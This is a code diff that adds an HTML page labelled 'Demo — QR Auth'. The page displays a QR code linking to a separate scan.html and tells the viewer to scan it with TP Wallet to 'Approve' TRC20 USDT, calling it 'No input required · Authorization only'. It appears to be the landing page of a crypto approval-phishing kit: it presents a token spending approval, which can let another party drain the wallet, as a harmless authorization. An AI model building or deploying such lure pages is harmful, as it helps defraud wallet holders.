@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Demo — QR Auth</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;text-align:center}
+h1{font-size:22px;margin-bottom:8px}
+.sub{color:rgba(255,255,255,0.4);font-size:13px;margin-bottom:30px}
+#qr{margin:20px 0}
+.note{color:rgba(255,255,255,0.3);font-size:11px;margin-top:20px;line-height:1.6}
+</style></head>
+<body>
+
+<h1>Scan to Authorize</h1>
+<div class="sub">TRC20 USDT · Approve</div>
+
+<div id="qr"></div>
+<div class="note">
+  Open TP Wallet → Scan QR → Confirm<br>
+  No input required · Authorization only
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+<script>
+// Point to where scan.html is hosted
+const DEMO_URL = window.location.origin + '/scan.html';
+new QRCode(document.getElementById('qr'), {
+  text: DEMO_URL,
+  width: 260, height: 260,
+  colorDark: '#fff', colorLight: '#000'
+});
+</script>
+</body>
+</html>
